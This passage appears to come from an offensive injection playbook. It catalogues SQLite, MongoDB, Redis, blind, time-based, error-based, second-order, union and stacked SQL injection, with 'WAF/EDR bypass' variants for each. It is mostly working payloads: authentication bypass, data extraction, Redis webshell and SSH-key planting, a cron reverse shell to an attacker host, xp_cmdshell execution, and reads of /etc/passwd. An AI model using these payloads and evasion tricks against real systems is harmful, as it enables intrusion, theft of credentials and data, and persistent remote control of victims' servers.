' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('/etc/passwd'),NULL--
```

**WAF/EDR bypass variants:**

**1. SQLite character-encoding bypass**
_Use the CHAR() function to construct strings, X-prefix hex literals, typeof() and unicode() for type-inference blind injection to bypass the WAF_
```
' UNION SELECT CHAR(116,101,115,116),NULL--
' UNION SELECT X'746573746461746131',NULL--
' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--
```

**2. SQLite operator and function substitution**
_Use LIKE/GLOB pattern matching to substitute the equals sign, instr() to substitute SUBSTRING, group_concat with replace to obfuscate data_
```
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--
' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--
```

---

### MongoDB injection  `sqli-mongodb-basic`
NoSQL database injection attack techniques
Sub-category: **MongoDB** · tags: `nosql` `mongodb` `injection`

**Prerequisites:** the target uses MongoDB; user input is concatenated into the query

**Attack chain:**

**1. 1. Probe the injection point**
_Probe MongoDB injection_
```
{"username": "admin", "password": "password"}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```

**2. 2. Bypass authentication**
_Bypass login authentication_
```
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**3. 3. Logical-operator injection**
_Use the $or logical operator_
```
{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
```

**4. 4. Regex injection**
_Regular-expression injection_
```
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

**5. 5. $where injection**
_$where clause JavaScript injection_
```
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
```

**6. 6. Blind extraction of data**
_Use regex to extract character by character_
```
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
Enumerate the username character by character
```

**WAF/EDR bypass variants:**

**1. Unicode bypass**
_Unicode encoding bypass_
```
{"username": {"\u0024ne": ""}}
Use Unicode encoding for the $ symbol
```

---

### Redis unauthorized access  `sqli-redis`
Redis unauthorized access and command injection
Sub-category: **Redis** · tags: `redis` `nosql` `injection`

**Prerequisites:** the Redis service is accessible; unauthorized or weak password

**Attack chain:**

**1. 1. Probe Redis**
_Probe the Redis service_
```
redis-cli -h target.com ping
redis-cli -h target.com info
```

**2. 2. Unauthorized access**
_Unauthorized access to Redis_
```
redis-cli -h target.com
> INFO
> KEYS *
> GET sensitive_key
```

**3. 3. Write a Webshell**  _[linux]_
_Write a Webshell_
```
redis-cli -h target.com
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE
```

**4. 4. Write an SSH public key**  _[linux]_
_Write an SSH public key_
```
redis-cli -h target.com
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET sshkey "ssh-rsa AAAA..."
> SAVE
```

**5. 5. Write a Cron job**  _[linux]_
_Write a Cron job_
```
redis-cli -h target.com
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> SAVE
```

**6. 6. Master-slave replication RCE**  _[linux]_
_Master-slave replication RCE_
```
Use the redis-rogue-server tool:
python redis-rogue-server.py --rhost target.com --lhost attacker.com
Load a malicious module via master-slave replication to execute commands
```

**WAF/EDR bypass variants:**

**1. Redis command obfuscation bypass**
_Use quote-split command strings, variable concatenation, etc. to obfuscate Redis commands and bypass WAF detection_
```
redis-cli -h target.com
> "C""O""N""F""I""G" SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
> SET shell "<?php system(\$_GET['cmd']); ?>"
> SAVE
```

**2. Redis Lua script execution bypass**
_Indirectly call Redis commands by executing Lua scripts via EVAL, bypassing detection of direct commands such as CONFIG/SET_
```
redis-cli -h target.com
> EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0
```

---

### Boolean blind injection  `sqli-blind`
Boolean-condition-based SQL blind injection techniques
Sub-category: **blind injection** · tags: `sqli` `blind` `boolean`

**Prerequisites:** an SQL injection exists; the page has two different responses for true/false

**Attack chain:**

**1. 1. Confirm blind injection**
_Confirm boolean blind injection_
```
' AND 1=1-- (returns normal)
' AND 1=2-- (returns abnormal)
Confirm boolean blind injection exists
```

**2. 2. Obtain the database-name length**
_Enumerate the database-name length_
```
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
...
' AND LENGTH(database())=N--
Until it returns normal
```

**3. 3. Enumerate the database name character by character**
_Extract the database name character by character_
```
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))>100--
...
Use binary search to quickly locate the character
```

**4. 4. Automate with a tool**
_Automate with sqlmap_
```
sqlmap -u "http://target.com?id=1" --technique=B --dbs
Use sqlmap for boolean blind injection
```

**WAF/EDR bypass variants:**

**1. Boolean-blind conditional-expression substitution**
_Use CASE WHEN to substitute IF(), MID() to substitute SUBSTRING(), LEFT/RIGHT combinations for extraction, BETWEEN to substitute greater/less-than comparisons_
```
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
```

**2. Boolean-blind arithmetic and bitwise-operation bypass**
_Use HEX/CONV for encoded comparison, bitwise AND (&) to judge character ranges, POW() math function obfuscation, DIV to substitute AND_
```
' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--
' AND (SELECT ORD(MID(database(),1,1))&0x40)=0x40--
' AND (SELECT POW(ORD(MID(database(),1,1)),0))+0=1--
' DIV 1 AND (SELECT LENGTH(database()))>0--
```

---

### Time blind injection  `sqli-time-based`
Time-delay-based SQL blind injection techniques
Sub-category: **blind injection** · tags: `sqli` `blind` `time`

**Prerequisites:** an SQL injection exists; the page response time is controllable

**Attack chain:**

**1. 1. Confirm time blind injection**
_Confirm time blind injection_
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
Observe whether the response is delayed by 5 seconds
```

**2. 2. Obtain the database-name length**
_Enumerate the database-name length_
```
' AND IF(LENGTH(database())=N,SLEEP(5),0)--
Enumerate the database-name length
```

**3. 3. Extract character by character**
_Extract data character by character_
```
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
Use binary search to extract characters
```

**4. 4. Delay functions for different databases**
_Delay functions for each database_
```
MySQL: SLEEP(5), BENCHMARK()
MSSQL: WAITFOR DELAY '0:0:5'
PostgreSQL: pg_sleep(5)
Oracle: DBMS_LOCK.SLEEP(5)
```

**WAF/EDR bypass variants:**

**1. Time-delay substitute-function bypass**
_Use BENCHMARK() to substitute SLEEP(), Cartesian-product heavy re-queries to consume time, GET_LOCK() lock waiting, CASE conditions to trigger delay_
```
' AND BENCHMARK(5000000,SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
' AND (CASE WHEN database() LIKE '%' THEN BENCHMARK(3000000,MD5('x')) ELSE 0 END)--
```

**2. Cross-database time-delay bypass**
_Use each database's specific time-delay method: PostgreSQL's pg_sleep conditional trigger, MSSQL's IF-condition WAITFOR, Oracle's DBMS_PIPE.RECEIVE_MESSAGE substituting DBMS_LOCK_
```
PostgreSQL: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle: ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--
MySQL: ' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--
```

---

### Error-based injection  `sqli-error-based`
SQL injection that extracts data via error messages
Sub-category: **error-based injection** · tags: `sqli` `error` `extractvalue`

**Prerequisites:** an SQL injection exists; the error message is displayed on the page

**Attack chain:**

**1. 1. Confirm error-based injection**
_Test error-based injection_
```
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```

**2. 2. Obtain database information**
_Obtain basic information_
```
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,version()))--
```

**3. 3. Obtain table names**
_Obtain table names_
```
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```

**4. 4. Obtain data**
_Extract data_
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```

**5. 5. Other error-based functions**
_Other error-based injection methods_
```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```

**WAF/EDR bypass variants:**

**1. Substitute error-function bypass**
_Use obscure functions such as the GEOMETRYCOLLECTION spatial function, JSON_KEYS, ST_LatFromGeoHash to substitute extractvalue/updatexml to trigger errors_
```
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--
```

**2. Encoding and scientific-notation bypass**
_Use unhex(hex()) double encoding, EXP() scientific-notation overflow, double URL encoding (%26%26 substituting AND) to bypass WAF detection_
```
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.schemata GROUP BY x)a)--
' %26%26 updatexml(1,concat(0x7e,(select%20database())),1)--%20
```

---

### Second-order SQL injection  `sqli-second-order`
SQL injection attack triggered after storage
Sub-category: **second-order injection** · tags: `sqli` `second-order` `stored`

**Prerequisites:** a data-storage feature exists; the stored data is used a second time

**Attack chain:**

**1. 1. Probe second-order injection**
_Probe the second-order injection point_
```
Register username: admin'--
Or: admin' OR '1'='1
After logging in, check whether it affects other features
```

**2. 2. Username injection**
_Trigger injection via the username_
```
Register user: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
Logging in triggers error-based injection
```

**3. 3. Password-reset injection**
_Injection in the password-reset feature_
```
Enter email: ' OR '1'='1
May trigger a password reset for all users
```

**4. 4. Order/comment injection**
_Trigger injection via a comment_
```
Submit comment: ' UNION SELECT username,password FROM users--
Triggered when an admin views the comment
```

**WAF/EDR bypass variants:**

**1. Encoded-storage trigger bypass**
_Use comment truncation (/**/) or CHAR() encoding to craft the payload during the storage stage; the WAF cannot detect the malicious SQL at input time, but it triggers automatically when the database uses the data a second time_
```
Register username: admin'/*
Then when changing the password, the SQL becomes: UPDATE users SET password='new' WHERE username='admin'/*'

Register username: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
After storage, the second use automatically decodes and triggers the injection
```

**2. Unicode-normalization bypass**
_Use Unicode full-width character (U+FF07) normalization, escape-sequence restoration, and filtering differences across feature modules to bypass WAF detection_
```
Register username: admin＇ OR ＇1＇=＇1
(Using the full-width quote U+FF07; the database normalizes it to half-width and triggers)

Register email: test@test.com' UNION SELECT password FROM users WHERE '1'='1
(Passes the WAF as an email, but triggers when concatenated in another query after storage)

Comment content: \x27 OR 1=1--
(The escape sequence is restored to a single quote at the storage layer)
```

---

### Union query injection  `sqli-union`
Use UNION SELECT to extract data
Sub-category: **union query** · tags: `sqli` `union` `select`

**Prerequisites:** an injection point exists; query results can be displayed

**Attack chain:**

**1. 1. Determine the column count**
_Determine the column count_
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Until it errors
Or:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**2. 2. Determine the display columns**
_Determine the display position_
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
Find out which columns are displayed on the page
```

**3. 3. Extract data**
_Extract data_
```
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

**4. 4. Bypass filtering**
_Bypass keyword filtering_
```
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--
```

**WAF/EDR bypass variants:**

**1. UNION-injection keyword bypass**
_Use the MySQL version comment /*!50000*/, URL-encode the UNION/SELECT keywords, %23 newline bypass, whitespace-character obfuscation (%09 TAB, %0d CR, %0b VT)_
```
' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' uNiOn%23%0aSeLeCt 1,2,3--
' UNION%0a%09%0d%0bSELECT%0a1,2,3--
```

**2. UNION-injection NULL-byte and chunked bypass**
_Use a NULL byte (%00) to truncate WAF detection, UNION ALL to bypass deduplication detection, HTTP chunked transfer encoding to spread keywords across different chunks, custom SEPARATOR to substitute the default comma_
```
' UNION%00SELECT 1,2,3--
' /*!UNION*/%20/*!ALL*//*!SELECT*/ 1,2,3--
Transfer-Encoding: chunked

5
UNION
7
 SELECT
1
 
0

' UNION SELECT 1,group_concat(table_name SEPARATOR 0x3c62723e),3 FROM information_schema.tables WHERE table_schema=database()--
```

---

### Stacked query injection  `sqli-stacked`
Injection that executes multiple SQL statements
Sub-category: **stacked query** · tags: `sqli` `stacked` `queries`

**Prerequisites:** multi-statement execution is supported; MySQL/PostgreSQL/MSSQL

**Attack chain:**

**1. 1. Probe stacked queries**
_Probe whether stacked queries are supported_
```
'; SELECT SLEEP(5)--
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--
```

**2. 2. MySQL stacked query**  _[linux]_
_MySQL executing multiple statements_
```
'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
'; SELECT SLEEP(5);--
> ⚠️ Only verify the existence of stacked injection; DROP/TRUNCATE/DELETE are strictly forbidden
```

**3. 3. MSSQL stacked query**  _[windows]_
_MSSQL executing commands_
```
'; EXEC xp_cmdshell('whoami');--
'; EXEC sp_executesql N'SELECT * FROM users';--
```

**4. 4. PostgreSQL stacked query**  _[linux]_
_PostgreSQL reading files_
```
'; COPY users FROM '/etc/passwd';--
'; SELECT * FROM pg_read_file('/etc/passwd');--
```

**WAF/EDR bypass variants:**

**1. Stacked-query terminator-substitution bypass**
_Use URL-encoded semicolon (%3B), newline separators, inline comments wrapping SELECT, PREPARE to prepare and execute a hex-encoded query statement_
```
' %3B SELECT user()--
' ;%0a SELECT user()--
' ; /*!SELECT*/ user()--
'; SET @q=0x53454C45435420757365722829; PREPARE stmt FROM @q; EXECUTE stmt;--
```

**2. Stacked-query conditional-execution bypass**
_Use string concatenation to split command keywords, CHAR() to encode command parameters, CASE conditional execution, PostgreSQL DO blocks to execute complex logic_
```
'; IF(1=1) EXEC('wh'+'oam'+'i');--
'; DECLARE @s VARCHAR(100)=CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105); EXEC xp_cmdshell @s;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END;--
'; DO $$ BEGIN PERFORM dblink_connect('host=attacker.com dbname=test'); END $$;--
```

---

### SQL injection WAF bypass  `sqli-waf-bypass`
Techniques for bypassing a Web Application Firewall
Sub-category: **WAF bypass** · tags: `sqli` `waf` `bypass`

**Prerequisites:** an SQL injection point exists on the target; a WAF protection exists

**Attack chain:**

**1. Chunked transfer encoding**
_Use chunked transfer to bypass WAF detection_
```
Transfer-Encoding: chunked

2
id
1
=
1
1

0
```

**2. HTTP parameter pollution (HPP)**
_Use HPP to split the malicious payload_
```
?id=1&id=UNION&id=SELECT&id=1,2,3--
```

**3. Equivalent-function substitution**
_Use GREATEST to substitute the > sign_
```
' AND GREATEST(1,0)--
```

**4. Comma-less injection**
_Perform a union query without commas_
```
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```

**5. IBM/Oracle specific**
_Use specific database characteristics to bypass generic rules_
```
' UNION SELECT CAST(1 AS VARCHAR(10)) FROM dual--
```

**6. Junk-data padding**
_Overflow the WAF buffer with overlong data (illustrative code)_
```
/* !50000AAAAAAAAAA...(1000+ bytes of junk data)...*/ UNION SELECT 1,2,3--
```

**7. Content-Type spoofing**
_Use multipart to bypass detection_
```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--
```

**8. JSON injection**
_Inject inside JSON data_
```
{"id": "1' UNION SELECT 1,2,3--"}
```

---
